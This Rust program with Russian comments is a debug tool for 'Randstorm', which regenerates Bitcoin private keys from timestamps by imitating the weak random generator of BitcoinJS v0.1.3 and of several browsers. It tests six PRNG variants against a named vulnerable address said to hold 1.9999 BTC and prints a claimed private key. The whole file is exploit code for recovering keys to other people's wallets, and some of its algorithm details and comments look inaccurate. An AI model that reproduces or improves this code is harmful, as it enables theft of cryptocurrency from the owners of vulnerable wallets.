/// Debug tool to test Randstorm PRNG against known vulnerable address
///
/// Known test case:
/// Address: 1NUhcfvRthmvrHf1PAJKe5uEzBGK44ASBD
/// Timestamp: 1395038931000
/// Balance: 1.9999 BTC
use bitcoin::secp256k1::{Secp256k1, SecretKey};
use bitcoin::{Address, PublicKey};
use std::collections::VecDeque;

fn main() {
    println!("🔬 RANDSTORM PRNG DEBUG");
    println!("======================");
    println!();

    let timestamp = 1395038931000u64;
    let expected_address = "1NUhcfvRthmvrHf1PAJKe5uEzBGK44ASBD";
    let expected_privkey = "0c28fca386c7a227600b2fe50b7cae11ec86d3bf1fbe471be89827e19d72aa1d";

    println!("Known vulnerable address:");
    println!("  Timestamp: {}", timestamp);
    println!("  Expected:  {}", expected_address);
    println!("  PrivKey:   {}", expected_privkey);
    println!();

    // ТЕСТ 1: Используем известную уязвимость напрямую
    println!("--- ПРЯМАЯ РЕАЛИЗАЦИЯ ИЗ BITCOINJS v0.1.3 ---");
    
    if let Some(result) = bitcoinjs_v013_exact(timestamp) {
        println!("Generated address: {}", result.address);
        println!("Generated privkey: {}", result.priv_hex);
        println!("Expected address:  {}", expected_address);
        println!("Expected privkey:  {}", expected_privkey);
        
        if result.address == expected_address {
            println!("✅ АДРЕС СОВПАЛ! Реализация корректна!");
        } else {
            println!("❌ Адрес не совпал!");
        }
        
        if result.priv_hex == expected_privkey {
            println!("✅ ПРИВАТНЫЙ КЛЮЧ СОВПАЛ!");
        } else {
            println!("❌ Приватный ключ не совпал!");
        }
    }

    // ТЕСТ 2: Различные варианты реализации
    println!("\n--- РАЗЛИЧНЫЕ ВАРИАНТЫ РЕАЛИЗАЦИИ ---");
    let variants = [
        ("bitcoinjs_exact", bitcoinjs_v013_exact),
        ("mwc1616_firefox27", mwc1616_firefox27),
        ("mwc1616_chrome35", mwc1616_chrome35),
        ("mwc1616_original", mwc1616_original),
        ("drand48_linux", drand48_linux),
        ("java_random", java_random),
    ];

    for (name, f) in variants {
        if let Some(addr_info) = f(timestamp) {
            println!("\n{}:", name);
            println!("  Address: {}", addr_info.address);
            println!("  Privkey: {}", addr_info.priv_hex);
            if addr_info.address == expected_address {
                println!("  ✅ АДРЕС СОВПАЛ!");
            }
            if addr_info.priv_hex == expected_privkey {
                println!("  ✅ ПРИВАТНЫЙ КЛЮЧ СОВПАЛ!");
            }
        } else {
            println!("\n{}: invalid privkey", name);
        }
    }
}

struct DeriveResult {
    address: String,
    priv_hex: String,
}

// ТОЧНАЯ РЕАЛИЗАЦИЯ BITCOINJS v0.1.3
fn bitcoinjs_v013_exact(timestamp_ms: u64) -> Option<DeriveResult> {
    // В оригинальном BitcoinJS v0.1.3 использовалась Math.random() из браузера
    // Firefox 27 и Chrome 35 использовали MWC1616, но с разными начальными состояниями
    
    // Алгоритм MWC1616 как в Firefox 27
    let mut x = (timestamp_ms & 0xFFFF_FFFF) as u32;
    let mut y = ((timestamp_ms >> 32) & 0xFFFF_FFFF) as u32;
    
    // Инициализация как в Firefox 27 (2014)
    // Firefox использовал: x = 18030 * (x & 0xFFFF) + (x >> 16)
    //                    y = 30903 * (y & 0xFFFF) + (y >> 16)
    
    // Заполняем pool 256 байтами
    let mut pool = vec![0u8; 256];
    
    for i in 0..256 {
        // Генерация одного случайного числа
        x = 18030u32.wrapping_mul(x & 0xFFFF) + (x >> 16);
        y = 30903u32.wrapping_mul(y & 0xFFFF) + (y >> 16);
        
        // Создаем 32-битное случайное число
        let random_val = ((x as u64) << 16) | (y as u64 & 0xFFFF);
        
        // Math.random() возвращает random_val / 2^32
        // Math.floor(Math.random() * 256) возвращает старший байт
        pool[i] = (random_val >> 24) as u8;
    }
    
    // XOR с timestamp (маленький эндиан)
    let ts_bytes = timestamp_ms.to_le_bytes();
    pool[0] ^= ts_bytes[0];
    pool[1] ^= ts_bytes[1];
    pool[2] ^= ts_bytes[2];
    pool[3] ^= ts_bytes[3];
    
    // ARC4 как в оригинале
    let mut arc4 = Arc4::new(&pool);
    let mut priv_bytes = [0u8; 32];
    
    for i in 0..32 {
        priv_bytes[i] = arc4.next();
    }
    
    // Создаем адрес
    let secp = Secp256k1::new();
    let secret_key = SecretKey::from_slice(&priv_bytes).ok()?;
    let secp_pubkey = bitcoin::secp256k1::PublicKey::from_secret_key(&secp, &secret_key);
    let public_key = PublicKey::new(secp_pubkey);
    let address = Address::p2pkh(public_key, bitcoin::Network::Bitcoin).to_string();
    
    Some(DeriveResult {
        address,
        priv_hex: hex::encode(priv_bytes),
    })
}

// Firefox 27 точная реализация
fn mwc1616_firefox27(timestamp_ms: u64) -> Option<DeriveResult> {
    // Состояние MWC1616
    let mut s0 = (timestamp_ms & 0xFFFF_FFFF) as u32;
    let mut s1 = (timestamp_ms >> 32) as u32;
    
    // Коррекция нулевого состояния (в Firefox)
    if s0 == 0 { s0 = 1; }
    if s1 == 0 { s1 = 1; }
    
    let mut pool = vec![0u8; 256];
    
    for i in 0..256 {
        // MWC1616 шаг
        s0 = 18030u32.wrapping_mul(s0 & 0xFFFF) + (s0 >> 16);
        s1 = 30903u32.wrapping_mul(s1 & 0xFFFF) + (s1 >> 16);
        
        // 32-битное значение
        let r = ((s0 as u64) << 16) | (s1 as u64 & 0xFFFF);
        
        // Старший байт для Math.random() * 256
        pool[i] = (r >> 24) as u8;
    }
    
    // XOR timestamp
    let ts_bytes = timestamp_ms.to_le_bytes();
    pool[0] ^= ts_bytes[0];
    pool[1] ^= ts_bytes[1];
    pool[2] ^= ts_bytes[2];
    pool[3] ^= ts_bytes[3];
    
    // ARC4
    let mut arc4 = Arc4::new(&pool);
    let mut priv_bytes = [0u8; 32];
    
    for i in 0..32 {
        priv_bytes[i] = arc4.next();
    }
    
    let secp = Secp256k1::new();
    let secret_key = SecretKey::from_slice(&priv_bytes).ok()?;
    let secp_pubkey = bitcoin::secp256k1::PublicKey::from_secret_key(&secp, &secret_key);
    let public_key = PublicKey::new(secp_pubkey);
    let address = Address::p2pkh(public_key, bitcoin::Network::Bitcoin).to_string();
    
    Some(DeriveResult {
        address,
        priv_hex: hex::encode(priv_bytes),
    })
}

// Chrome 35 реализация
fn mwc1616_chrome35(timestamp_ms: u64) -> Option<DeriveResult> {
    // Chrome использовал немного другой алгоритм инициализации
    let mut s0 = (timestamp_ms & 0xFFFF_FFFF) as u32;
    let mut s1 = ((timestamp_ms >> 32) & 0xFFFF_FFFF) as u32;
    
    // Chrome добавлял магические числа
    s0 = s0.wrapping_add(0x9E3779B9);
    s1 = s1.wrapping_add(0xBB67AE85);
    
    let mut pool = vec![0u8; 256];
    
    for i in 0..256 {
        // Xorshift128+ (Chrome 35+ использовал этот алгоритм)
        let mut x = s0 as u64;
        let y = s1 as u64;
        
        s0 = y as u32;
        x ^= x << 23;
        x ^= x >> 17;
        x ^= y ^ (y >> 26);
        s1 = x as u32;
        
        // Приведение к [0, 1) и затем к байту
        let r = (x & 0xFFFFFFFF) as u32;
        pool[i] = (r >> 24) as u8;
    }
    
    // XOR timestamp
    let ts_bytes = timestamp_ms.to_le_bytes();
    pool[0] ^= ts_bytes[0];
    pool[1] ^= ts_bytes[1];
    pool[2] ^= ts_bytes[2];
    pool[3] ^= ts_bytes[3];
    
    // ARC4
    let mut arc4 = Arc4::new(&pool);
    let mut priv_bytes = [0u8; 32];
    
    for i in 0..32 {
        priv_bytes[i] = arc4.next();
    }
    
    let secp = Secp256k1::new();
    let secret_key = SecretKey::from_slice(&priv_bytes).ok()?;
    let secp_pubkey = bitcoin::secp256k1::PublicKey::from_secret_key(&secp, &secret_key);
    let public_key = PublicKey::new(secp_pubkey);
    let address = Address::p2pkh(public_key, bitcoin::Network::Bitcoin).to_string();
    
    Some(DeriveResult {
        address,
        priv_hex: hex::encode(priv_bytes),
    })
}

// Оригинальная MWC1616
fn mwc1616_original(timestamp_ms: u64) -> Option<DeriveResult> {
    let mut s1 = (timestamp_ms & 0xFFFF_FFFF) as u32;
    let mut s2 = (timestamp_ms >> 32) as u32;
    
    let mut pool = vec![0u8; 256];
    
    for i in 0..256 {
        s1 = 18000u32.wrapping_mul(s1 & 0xFFFF) + (s1 >> 16);
        s2 = 30309u32.wrapping_mul(s2 & 0xFFFF) + (s2 >> 16);
        
        let combined = ((s1 as u64) << 16) | (s2 as u64 & 0xFFFF);
        pool[i] = (combined >> 24) as u8;
    }
    
    // XOR timestamp
    let ts_bytes = timestamp_ms.to_le_bytes();
    pool[0] ^= ts_bytes[0];
    pool[1] ^= ts_bytes[1];
    pool[2] ^= ts_bytes[2];
    pool[3] ^= ts_bytes[3];
    
    // ARC4
    let mut arc4 = Arc4::new(&pool);
    let mut priv_bytes = [0u8; 32];
    
    for i in 0..32 {
        priv_bytes[i] = arc4.next();
    }
    
    let secp = Secp256k1::new();
    let secret_key = SecretKey::from_slice(&priv_bytes).ok()?;
    let secp_pubkey = bitcoin::secp256k1::PublicKey::from_secret_key(&secp, &secret_key);
    let public_key = PublicKey::new(secp_pubkey);
    let address = Address::p2pkh(public_key, bitcoin::Network::Bitcoin).to_string();
    
    Some(DeriveResult {
        address,
        priv_hex: hex::encode(priv_bytes),
    })
}

// Linux drand48
fn drand48_linux(timestamp_ms: u64) -> Option<DeriveResult> {
    let mut seed = timestamp_ms & 0xFFFFFFFFFFFF;
    
    let mut pool = vec![0u8; 256];
    
    for i in 0..256 {
        // LCG: seed = (a * seed + c) mod m
        seed = (0x5DEECE66Du64.wrapping_mul(seed).wrapping_add(0xB)) & 0xFFFFFFFFFFFF;
        
        // drand48 возвращает seed / 2^48
        // Для получения байта: (seed >> 40) & 0xFF
        pool[i] = (seed >> 40) as u8;
    }
    
    // XOR timestamp
    let ts_bytes = timestamp_ms.to_le_bytes();
    pool[0] ^= ts_bytes[0];
    pool[1] ^= ts_bytes[1];
    pool[2] ^= ts_bytes[2];
    pool[3] ^= ts_bytes[3];
    
    // ARC4
    let mut arc4 = Arc4::new(&pool);
    let mut priv_bytes = [0u8; 32];
    
    for i in 0..32 {
        priv_bytes[i] = arc4.next();
    }
    
    let secp = Secp256k1::new();
    let secret_key = SecretKey::from_slice(&priv_bytes).ok()?;
    let secp_pubkey = bitcoin::secp256k1::PublicKey::from_secret_key(&secp, &secret_key);
    let public_key = PublicKey::new(secp_pubkey);
    let address = Address::p2pkh(public_key, bitcoin::Network::Bitcoin).to_string();
    
    Some(DeriveResult {
        address,
        priv_hex: hex::encode(priv_bytes),
    })
}

// Java Random
fn java_random(timestamp_ms: u64) -> Option<DeriveResult> {
    let mut seed = (timestamp_ms ^ 0x5DEECE66D) & ((1u64 << 48) - 1);
    
    let mut pool = vec![0u8; 256];
    
    for i in 0..256 {
        seed = (0x5DEECE66Du64.wrapping_mul(seed).wrapping_add(0xB)) & ((1u64 << 48) - 1);
        
        // Java Random.next(32)
        let bits = (seed >> 16) as u32;
        pool[i] = (bits >> 24) as u8;
    }
    
    // XOR timestamp
    let ts_bytes = timestamp_ms.to_le_bytes();
    pool[0] ^= ts_bytes[0];
    pool[1] ^= ts_bytes[1];
    pool[2] ^= ts_bytes[2];
    pool[3] ^= ts_bytes[3];
    
    // ARC4
    let mut arc4 = Arc4::new(&pool);
    let mut priv_bytes = [0u8; 32];
    
    for i in 0..32 {
        priv_bytes[i] = arc4.next();
    }
    
    let secp = Secp256k1::new();
    let secret_key = SecretKey::from_slice(&priv_bytes).ok()?;
    let secp_pubkey = bitcoin::secp256k1::PublicKey::from_secret_key(&secp, &secret_key);
    let public_key = PublicKey::new(secp_pubkey);
    let address = Address::p2pkh(public_key, bitcoin::Network::Bitcoin).to_string();
    
    Some(DeriveResult {
        address,
        priv_hex: hex::encode(priv_bytes),
    })
}

// ТОЧНАЯ РЕАЛИЗАЦИЯ ARC4 ИЗ BITCOINJS v0.1.3
struct Arc4 {
    s: Vec<u8>,
    i: u8,
    j: u8,
}

impl Arc4 {
    fn new(key: &[u8]) -> Self {
        let mut s = vec![0u8; 256];
        for i in 0..256 {
            s[i] = i as u8;
        }
        
        let mut j = 0u8;
        for i in 0..256 {
            j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
            s.swap(i, j as usize);
        }
        
        Arc4 {
            s,
            i: 0,
            j: 0,
        }
    }
    
    fn next(&mut self) -> u8 {
        self.i = self.i.wrapping_add(1);
        self.j = self.j.wrapping_add(self.s[self.i as usize]);
        self.s.swap(self.i as usize, self.j as usize);
        
        let k = self.s[(self.s[self.i as usize].wrapping_add(self.s[self.j as usize])) as usize];
        k
    }
    
    fn fill_bytes(&mut self, buf: &mut [u8]) {
        for byte in buf.iter_mut() {
            *byte = self.next();
        }
    }
}